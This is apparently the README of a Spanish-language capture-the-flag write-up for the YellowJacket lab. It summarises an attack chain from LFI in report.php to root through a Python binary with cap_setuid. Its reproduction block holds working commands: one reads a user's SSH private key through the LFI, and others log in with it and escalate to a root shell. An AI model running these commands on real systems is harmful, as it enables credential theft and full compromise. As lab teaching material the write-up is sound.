# YellowJacket — Writeup público

Auditoría de seguridad del laboratorio **YellowJacket** de [Whoami-Labs](https://whoami-labs.com/laboratorios/yellowjacket).

| Campo | Valor |
|---|---|
| Objetivo | `172.17.0.2` |
| Servicios | `80/tcp` HTTP, `2222/tcp` SSH |
| Dificultad | Hard ★★★★★☆☆☆ |
| Fecha | 2026-11-15 |
| Analista | chifay |
| Resultado | Compromiso total: `vince` → `root` |

## Documento principal

👉 **[WRITEUP_YELLOWJACKET.md](WRITEUP_YELLOWJACKET.md)** — auditoría completa, cadena de ataque, hallazgos, impacto, remediación y evidencias visuales.

## Contenido

```text
.
├── README.md
├── WRITEUP_YELLOWJACKET.md
└── screenshots/
    ├── 01_nmap.png
    ├── 02_web_enum.png
    ├── 03_lfi_passwd.png
    ├── 04_lfi_key.png
    ├── 05_ssh_vince.png
    ├── 06_capabilities.png
    └── 07_root_flag.png
```

## Cadena de ataque (resumen)

```text
LFI en report.php
  → /etc/passwd (usuarios stinger/vince)
  → /home/vince/.ssh/id_rsa (644)
  → SSH :2222 como vince
  → /usr/bin/python3.9 con cap_setuid+ep
  → uid=0
  → /root/flag.txt
```

## Flags

> **Spoiler:** los valores internos se ocultan en esta versión pública. Están documentados, también redactados, en la sección 14 del writeup.

- Usuario: `Whoami{REDACTADO}`
- Root (final): `Whoami{REDACTADO}`

## Reproducción rápida

```bash
TARGET=172.17.0.2

# 1. LFI: leer la clave de vince
curl -sS "http://$TARGET/report.php?file=/home/vince/.ssh/id_rsa" -o /tmp/vince_id_rsa
chmod 600 /tmp/vince_id_rsa

# 2. Acceso SSH
ssh -i /tmp/vince_id_rsa -p 2222 vince@$TARGET

# 3. Enumerar la capability
python3 -c 'import os; print(os.getxattr("/usr/bin/python3.9","security.capability").hex())'

# 4. Escalar a root
python3 -c 'import os; os.setuid(0); os.system("/bin/bash -p")'

# 5. Flag final
cat /root/flag.txt
```

## Capturas

Para la publicación se aplicaron estas medidas:

- Difuminado de la clave privada, el fingerprint y el valor interno de las flags.

## Notas

- La clave privada y su fingerprint **no forman parte de este repositorio**.
- Las capturas corresponden a un entorno efímero de laboratorio y no deben reutilizarse en sistemas reales sin autorización.
- Este material es exclusivamente educativo y se realizó sobre un entorno de laboratorio autorizado.
